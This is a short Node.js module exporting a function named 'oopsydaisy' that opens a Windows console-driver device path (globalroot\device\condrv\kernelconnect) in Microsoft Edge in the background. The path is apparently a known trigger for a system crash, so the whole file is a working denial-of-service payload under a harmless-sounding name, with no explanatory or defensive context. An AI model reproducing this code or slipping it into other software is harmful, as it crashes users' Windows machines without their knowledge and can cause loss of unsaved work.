const open = require('open');

function oopsydaisy() {
    open('\\\\.\\globalroot\\device\\condrv\\kernelconnect', { background: true, app: 'msedge' });
}

module.exports = oopsydaisy